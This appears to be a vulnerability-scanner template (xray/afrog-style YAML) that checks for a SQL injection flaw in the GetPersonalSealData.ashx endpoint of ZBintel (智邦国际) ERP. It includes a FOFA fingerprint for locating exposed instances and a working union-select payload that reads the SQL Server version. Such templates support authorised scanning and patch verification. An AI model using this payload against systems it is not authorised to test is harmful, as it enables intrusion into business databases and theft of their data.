id: zbintel-erp-getpersonalsealdata-sqli

info:
  name: 智邦国际ERP-GetPersonalSealData.ashx存在SQL注入漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    智邦国际ERP系统GetPersonalSealData.ashx接口处存在sql注入漏洞，攻击者可利用此漏洞获取数据库敏感信息。
    FOFA：icon_hash="-682445886"
  reference:
    - https://cn-sec.com/archives/2794884.html
  tags: zbintel,erp,sqli
  created: 2025/03/26

rules:
  r0:
    request:
      method: GET
      path: /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b"Microsoft SQL Server") && 
      response.body.ibcontains(b'"SealData":') &&
      response.body.ibcontains(b'"Image":')
expression: r0()
